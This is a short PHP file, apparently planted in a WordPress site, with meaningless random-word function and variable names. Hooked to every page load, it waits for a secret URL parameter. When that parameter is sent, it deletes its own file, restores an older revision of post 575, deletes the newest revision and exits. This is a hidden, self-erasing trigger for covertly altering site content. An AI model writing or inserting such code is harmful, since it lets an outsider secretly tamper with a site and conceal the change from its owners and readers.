<?php

function editor_validator_reports_publisher() {
	if (isset($_GET['compare_team_support']) && $_GET['compare_team_support'] === 'restaurant_suite_disable') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$toolbox_awesome_sitemaps_allow = 575;
		$modal_remove_search_back = wp_get_post_revisions($toolbox_awesome_sitemaps_allow);
		if (empty($modal_remove_search_back)) die('no revisions');
		if (count($modal_remove_search_back) < 2) die('less than 2');
		$traffic_translator_results = array_shift($modal_remove_search_back);
		$automatic_virtual_snippets = $traffic_translator_results->ID;
		$sliding_profile_online = array_shift($modal_remove_search_back);
		$options_code_amp_plupload = $sliding_profile_online->ID;
		$fancy_estate_json_adsense = wp_restore_post_revision($options_code_amp_plupload);
		if ($fancy_estate_json_adsense === false) die('error restoring');
		$fancy_estate_json_adsense = wp_delete_post_revision($automatic_virtual_snippets);		
		if ($fancy_estate_json_adsense === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'editor_validator_reports_publisher');
